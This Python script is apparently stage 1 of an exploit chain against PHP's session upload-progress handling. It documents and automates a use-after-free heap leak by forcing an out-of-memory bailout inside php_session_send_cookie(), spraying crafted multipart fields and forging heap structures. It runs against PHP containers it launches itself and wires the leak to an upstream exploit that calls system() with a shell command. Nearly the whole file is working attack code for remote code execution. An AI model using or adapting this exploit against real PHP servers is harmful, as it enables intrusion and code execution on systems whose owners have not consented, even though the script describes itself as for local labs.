#!/usr/bin/env python3
"""Stage-1 heap leak for the PHP branches that clear PS(send_cookie).

Why this exists
---------------
The published chain leaks the Zend MM chunk base through the Set-Cookie of the
*second* request.  That cookie is only emitted when PS(send_cookie) is still 1
at the end of request A.  PHP 8.4 and 8.3 preserve that flag across the
request boundary because php_session_reset_id() returns FAILURE *before*
clearing it when the cookie send fails; PHP 8.2 and older ignore the send
result and always clear it:

    8.4.26   if (PS(use_cookies) && PS(send_cookie)) {
                 zend_result cookies_sent = php_session_send_cookie();
                 if (UNEXPECTED(cookies_sent == FAILURE)) { return FAILURE; }
                 PS(send_cookie) = 0;
             }
    8.1.17   if (PS(use_cookies) && PS(send_cookie)) {
                 php_session_send_cookie();
                 PS(send_cookie) = 0;
             }

So on 8.1/8.0/7.4/5.6 request B never sends a cookie and the leak is
impossible -- even though the use-after-free itself fires (the session file is
created with the sprayed value as its id).

The fix is to make request A die *inside* php_session_send_cookie(): a bailout
there skips the "PS(send_cookie) = 0" statement, leaving the flag stale for
request B.  A bailout also skips the module RSHUTDOWN (the session module's
RINIT never ran, because the upload-progress session init happens during
multipart parsing, i.e. before RINIT), which is what keeps PS(id) dangling.

Request A is therefore shaped as:

    1001 small fields      -> max_input_vars warning -> headers_sent = 1
    PHPSESSID=\\x00        -> php_session_initialize() creates a fresh sid
    PHP_SESSION_UPLOAD_PROGRESS
    filler field (size S)  -> consumes memory up to just below the limit
    file part              -> FILE_START -> session init -> cookie send -> OOM

The filler size S is swept; the OOM message reports the source location, so we
can tell when the bailout moved into php_session_send_cookie().

Local disposable containers only.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import struct
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402

OOM_RE = re.compile(rb"Allowed memory size of (\d+) bytes exhausted \(tried to allocate (\d+) bytes\) in ([^<]+) on line (\d+)")
OOM_RE2 = re.compile(rb"Allowed memory size of (\d+) bytes exhausted \(tried to allocate (\d+) bytes\)")
LOC_RE = re.compile(rb"in ([A-Za-z0-9_./-]+) on line (\d+)")


def start(image: str, port: int, name: str) -> tuple[str, str]:
    M.docker("rm", "-f", name)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", name))
    M.docker(
        "run", "-d", "--name", name,
        "-p", f"127.0.0.1:{port}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        image, timeout=900,
    )
    url = f"http://127.0.0.1:{port}/index.php"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")
    return url, outdir


def oom_info(resp: bytes) -> str:
    """Where did the memory limit bite?"""
    m = OOM_RE.search(resp) or OOM_RE2.search(resp)
    if not m:
        return "no-oom"
    tail = resp[m.end():m.end() + 200]
    loc = LOC_RE.search(tail)
    where = ""
    if loc:
        where = f" {loc.group(1).decode('latin1')}:{loc.group(2).decode('latin1')}"
    return (f"oom limit={m.group(1).decode()} tried={m.group(2).decode()}"
            f"{where}")


def request_a(mod, ex, filler: int, nfields: int = 1001, fsize: int = 3000,
              big_mb: int = 12) -> bytes:
    """Request A: die inside php_session_send_cookie()."""
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * fsize} for i in range(nfields)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    if filler > 0:
        parts.append({"name": "zfill", "data": b"Z" * filler})
    parts.append(ex._file_part())
    if big_mb > 0:
        parts.append(ex._big_field())
    return ex.t.post(mod.build_multipart(parts, b"S" * 17), b"S" * 17,
                     read_cap=1 << 20, timeout=max(120.0, ex.t.timeout))


def request_b(mod, ex, n: int, forge_len: int = 79) -> bytes:
    """Request B: reoccupy the dangling PS(id) block and read it back."""
    parts = [
        {"name": "PHPSESSID", "data": mod.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        parts.append({"name": str(1000 + i),
                      "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    forge = bytearray(b"A" * forge_len)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return ex.t.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--name", required=True)
    ap.add_argument("--fillers", required=True,
                    help="comma separated filler sizes in bytes")
    ap.add_argument("--ns", default="892",
                    help="comma separated spray counts for request B")
    ap.add_argument("--forge-lens", default="79")
    ap.add_argument("--nfields", type=int, default=1001)
    ap.add_argument("--fsize", type=int, default=3000)
    ap.add_argument("--big-mb", type=int, default=12)
    ap.add_argument("--out", default=None)
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    fillers = [int(x) for x in args.fillers.split(",") if x]
    ns = [int(x) for x in args.ns.split(",") if x]
    flens = [int(x) for x in args.forge_lens.split(",") if x]

    url, _ = start(args.image, args.port, args.name)
    sym = C.extract_symbols(VENDOR, args.name)
    mod = C.load_upstream(VENDOR)
    t = mod.Target(url, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm", verbose=False)

    print(f"[*] {args.image}  zif={hex(sym['zif_system'])} dtor={hex(sym['zval_ptr_dtor'])}")
    rows = []
    hit = False
    for filler in fillers:
        for n in ns:
            for flen in flens:
                # fresh worker for every attempt so the heap state is clean
                ex.rotate()
                ra = request_a(mod, ex, filler, args.nfields, args.fsize, args.big_mb)
                where = oom_info(ra)
                if args.verbose:
                    print("    A head:", ra[:220])
                    print("    A body:", re.sub(rb"\s+", b" ", ra[ra.find(b"\r\n\r\n"):])[:400])
                rb = request_b(mod, ex, n, flen)
                raw = C._cookie(rb)
                base = C.chunk_base(raw)
                print("filler=%-9d n=%-5d flen=%-4d cookie=%-6d chunk=%-16s A: %s"
                      % (filler, n, flen, len(raw), hex(base) if base else "-", where))
                rows.append({"filler": filler, "n": n, "forge_len": flen,
                             "cookie_len": len(raw),
                             "chunk": hex(base) if base else None,
                             "oom": where})
                if base:
                    print("[+] stage-1 leak found", flush=True)
                    hit = True
                    break
            if hit:
                break
        if hit:
            break

    if args.out:
        json.dump(rows, open(args.out, "w", encoding="utf-8"), indent=2)
    M.docker("rm", "-f", args.name)
    return 0 if hit else 1


if __name__ == "__main__":
    sys.exit(main())
